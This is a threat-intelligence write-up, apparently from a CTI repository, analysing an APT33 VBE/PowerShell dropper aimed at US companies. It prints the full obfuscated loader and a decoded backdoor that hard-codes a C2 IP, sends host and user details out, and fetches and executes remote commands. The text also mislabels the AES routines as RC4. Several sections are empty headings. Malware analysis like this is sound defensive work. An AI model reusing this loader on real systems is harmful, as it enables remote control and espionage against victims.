# APT33 continue to target US companies
## Table of Contents
* [Malware analysis](#Malware-analysis)
* [Threat Intelligence](#Intel)
* [Cyber kill chain](#Cyber-kill-chain)
* [Indicators Of Compromise (IOC)](#IOC)
* [References MITRE ATT&CK Matrix](#Ref-MITRE-ATTACK)
* [Knowledge Graph](#Knowledge)
* [Links](#Links)
  + [Originals Tweets](#Original-Tweet)
  + [Link Anyrun](#Links-Anyrun)
  + [Ressources](#Ressources)

<h2>Malware analysis <a name="Malware-analysis"></a></h2>
<h6>The initial sample reported as VBE file by APT33. The fact to use VBScript Encoded Script File as vector have been firstly observed on the Muddywater group and after APT33, this TTPs is currently used  by the both Iranian groups in theirs operations.
Firstly, we can confirm that an VBE file by the magic number sequence ```23 40 7E (in ASCII "#@~")```.</h6>
<p align="center">
  <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/Iran/APT/APT33/16-11-19/Analysis/VBE%20-1.png">
</p>
<h6> Once decoded, we can observed the first layer of the powershell script, this use a common series of techniques for obfuscate the payload. This decode in base 64 a stream of a zip file, extract it in the memory and execute the code still in memory.</h6>

``` powershell
powershell /w 1 IEX(New-Object IO.StreamReader((New-Object System.IO.Compression.GzipStream([IO.MemoryStream][Convert]::FromBase64String('H4sIAJ0RyV0C/51WW3PaOhB+96/QePyAWyxugbRheCAOadKEhAM0nTaTOSPsBVSM5cpyCOHw38/KNpekTdJzMnlAq719u592fTtYxgrm9AoUHYC85x70BA9Vl4VsAvLu6EhLQbogFR9zjym4YQH3meIidFkQjJg3Iy2yspRMYG1Ysdcyp0pF8VGpVK3UaLV6SCv1Oq3Wjw4OaiYqvHZfGrERBE4kguWYB0GpQWu0clAyjXESejokcdtdUrBmsCxa5zf2ylByicEZpnAFC+d69AM8Rcwc1QC8RHK1pK5cRkpMJIumS9rnP0KfQZBh9E1jTRCXN/2vftoQZ+dN4aS45z5IE8vAaFf4gN5uX3Xh8mgKUqtipd1jVxv2mO/zcPKmba6XG38HKWJtfhwIbzbgjzp4pfpBiy5gmQuq9YbBx1hArJ2x2vykE1DDZQQFm16xORAHfiJ0JdG7iWro4fxmLx1XhMgIhUFPpZgfsxgaB5l26ndtQBDDzgxla2OdxcK+bePi77cDY+p/GFm73gudGWqpDm6x9Y5CnSt3Q6EkRApZo70QQ3hQtBN6QtcWA30Znn6gn0AdLxXEBW1gpCzRPNQ+DEvXFQO6EvBxoGXaI1lAvbG+ATqULIzHQs5PeciCtD8Fa1Qk5SKxRvQSwoma2sbtCCPc3t0RK8ocYvHeE2ts/Ap+KJ5Cj2xjD95JZwsPQu85vtdKqNUNK2va6LZM8WHePUWrm2lY/j7iE9hDnOgb/0XElcYeZOLg2TbeKvwmucTew4hy5yuMvIBDqBCtK8SMg01WWXIFfX+CyRHnFLNg+JJ9v9Ttlpb4Z9rNTOsWpxgoPtfPp8dkDJ0H5qmC5Rf3tYtWmASBtpm9bGNWqiX8r5YrH83fW2eUJ06gsECYKDxwhbxMYpChpn6LmDgcIxbHCyH9zVGKh2Uig/y48J6Op73ZjcVw02I0DcOatlA7DYhFZqFPCsiRGNseY+0UGwVA3cv+TXamXfZDSOJMFKnaNmaGYegZMBxkMW37fsE8E7FCINP8efEx+rVXOOklj9TR3jy39MVLI7y5NfCeWeh5+TzmF6yL054gIKxnVzyiJ1aq0zIpfOWhLxYxuRqSSpmWmwQFjYMmeWgc2KQdRQFgLS64KtVrh7TWIIWLs2H3skgCPgPkjTcTNnGnyH0oHTZomdY+lD/SSrlMBmzMJM/NcPz8klMfxiBxvBdNvE3Lu+lPSrxF9Fp3elp1Z1FM9+WGF1sWpN3asiB12xsM9APMnu1QOOkygOxV7FSJ0457AeOhfkYp6z1AyuJ89ST4MXoIMTORZRZnmc3T/TfHGlOWKDFPdzrtDfBd+yjkLCDbzIo6j6YGSXfX2u02RBPXqKYHWRFdOWzgCYxZEqhn+hp3k2QtT4uihYsIRbm58bb5zvh5Nijfk+ic0gJ7m/lAnnf1dq9NZ8jKPvxMIFaZil7KqWUR1xLE+rmcn7TyaWPaGQqyN5ciiaNBagxe8rsF3sOueTxiAc1pfJ6mqpYYCWeWm0iJZz1JX2DTy562AkSb6CU1+aMEjhMeqPOwLwI90tr+nIc8VpLhQM+4iR0/jzOFAjq18eVD0DLfmWvdruyALxi/w1ZW0kqDU82Y93iTf1itUkcQ3h/tiK43vZUJPTGPEpVd2JZpr3LPSeuJzRqrLVrmVuYjY3nYtJLmL14ySa9/7XYGg+v+3+2+e3Y+7LjDL/1O04q433ztEzX7pIyiFu5D4uitd1iNP8/mwfzg0/fltwU8fvs5a/SHl8n08bOML+4rlb8uknq7Ep4OvRZxkpBYYvdNiY7MTr9/3ddzLidIvqJ2K8zJOIUPOrIp9iUMBPPjfPXF2E5NBx/+Vz4aRh44H1u4hvQ0NN+hs3emnvnRP4TDg/5UStFn2lsMa2OgmFTOIACISK1c/gOtxota/wJs3EOYdAwAAA=='),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()
```

<h6>On the second layer, we can see multiple bloc of fuctions and variables. The first bloc content the parameters like IP, the validation for check the validity of the certificate and URL</h6>

``` powershell 
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
$IP="https://213.227.155.25:443"
$URL="https://213.227.155.25:443/babel-polyfill/6.3.14/"
```

<h6>The next bloc content the functions for decode and encode in RC4. This is used for obfuscated the strings and communcations between the client and the server C2</h6>

``` powershell 
function CAM ($key,$IV)
{
    try {$a = New-Object "System.Security.Cryptography.RijndaelManaged"} catch {$a = New-Object "System.Security.Cryptography.AesCryptoServiceProvider"}
    $a.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $a.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    $a.BlockSize = 128
    $a.KeySize = 256
    if ($IV)
    {
        if ($IV.getType().Name -eq "String") { $a.IV = [System.Convert]::FromBase64String($IV) }
        else {$a.IV = $IV}
    }
    if ($key)
    {
        if ($key.getType().Name -eq "String"){ $a.Key = [System.Convert]::FromBase64String($key) }
        else{$a.Key = $key}
    }
    $a
}
function ENC ($key,$un)
{
    $b = [System.Text.Encoding]::UTF8.GetBytes($un)
    $a = CAM $key
    $e = $a.CreateEncryptor()
    $f = $e.TransformFinalBlock($b, 0, $b.Length)
    [byte[]] $p = $a.IV + $f
    [System.Convert]::ToBase64String($p)
}
function DEC ($key,$enc)
{
    $b = [System.Convert]::FromBase64String($enc)
    $IV = $b[0..15]
    $a = CAM $key $IV
    $d = $a.CreateDecryptor()
    $u = $d.TransformFinalBlock($b, 16, $b.Length - 16)
    [System.Text.Encoding]::UTF8.GetString($u)
}
```

``` powershell 
function Get-Webclient ($Cookie) 
{
    #Kill switch
    $date = (Get-Date -Format "dd/MM/yyyy");
    $date = [datetime]::ParseExact($date,"dd/MM/yyyy",$null);
    $EndOp = [datetime]::ParseExact("12/12/2019","dd/MM/yyyy",$null);
    if ($EndOp -lt $date) {exit}

    $username = ""
    $password = ""
    $proxyurl = ""
    $webclient = New-Object System.Net.WebClient;
    $h=""
    #check the version of the common language runtime (CLR)
    if ($h -and (($psversiontable.CLRVersion.Major -gt 2))) {$webclient.Headers.Add("Host",$h)}
    elseif($h)
    {
        $script:s="https://$($h)/babel-polyfill/6.3.14/"
        $script:sc="https://$($h)"
    }
    $webclient.Headers.Add("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36")
    $webclient.Headers.Add("Referer","")
    if ($proxyurl) 
    {
        $webproxy = New-Object System.Net.WebProxy($proxyurl,$true);
        if ($username -and $password) 
        {
            $PSS = ConvertTo-SecureString $password -AsPlainText -Force
            $getcreds = new-object system.management.automation.PSCredential $username,$PSS
            $webproxy.Credentials = $getcreds
        } 
        else { $webclient.UseDefaultCredentials = $true }
        $webclient.Proxy = $webproxy; 
    } 
    else 
    {
        $webclient.UseDefaultCredentials = $true;
        $webclient.Proxy.Credentials = $webclient.Credentials;
    } 
    if ($cookie) { $webclient.Headers.Add([System.Net.HttpRequestHeader]::Cookie, "SessionID=$Cookie") }
    $webclient 
}
function main 
{
    $cu = [System.Security.Principal.WindowsIdentity]::GetCurrent()
    $webproxy = New-Object System.Security.Principal.WindowsPrincipal($cu)
    $ag = [System.Security.Principal.WindowsBuiltInRole]::Administrator
    if ($webproxy.IsInRole($ag)){$el="*"}else{$el=""}
    try{$u=($cu).name+$el} 
    catch
    {
        if ($env:username -eq "$($env:computername)$"){}
        else{$u=$env:username}
    }
    $o="$env:userdomain;$u;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid;https://213.227.155.25:443"
    try {$pp=enc -key 72sJkmlm4GZyYwezYqk6RTLuhzJrsKv11QKu5A1nFTc= -un $o}
    catch {$pp="ERROR"}
    $main = (Get-Webclient -Cookie $pp).downloadstring($URL)
    $p = dec -key 72sJkmlm4GZyYwezYqk6RTLuhzJrsKv11QKu5A1nFTc= -enc $main
    if ($p -like "*key*") {$p| iex}
}
try {main} catch {}
Start-Sleep 300
try {main} catch {}
Start-Sleep 600
try {main} catch {}
```


<h2> Indicators Of Compromise (IOC) <a name="IOC"></a></h2>
<h6> List of all the Indicators Of Compromise (IOC)</h6>
<h2> References MITRE ATT&CK Matrix <a name="Ref-MITRE-ATTACK"></a></h2>
<h2>Knowledge Graph<a name="Knowledge"></a></h2><a name="Know"></a>
<h6>The following diagram shows the relationships of the techniques used by the groups and their corresponding malware:</h6>
<h6> Original tweet: </h6><a name="tweet"></a>

* [https://twitter.com/CTI_Marc/status/1194573048625729536](https://twitter.com/CTI_Marc/status/1194573048625729536) 

<h6> Links Anyrun: <a name="Links-Anyrun"></a></h6>

* [6850189bbf5191a76761ab20f7c630ef.xls](https://app.any.run/tasks/27ea35e6-6211-468d-9b8a-8c4cf22764ce)
* [AramCoJobs.hta](https://app.any.run/tasks/124bd8cf-4a93-4e39-94c2-fa7790706260)

<h6> Ressources : </h6><a name="Ressources"></a>

* [Elfin: Relentless Espionage Group Targets Multiple Organizations in Saudi Arabia and U.S.](https://www.symantec.com/blogs/threat-intelligence/elfin-apt33-espionage)
* [APT33 PowerShell Malware](https://norfolkinfosec.com/apt33-powershell-malware/)
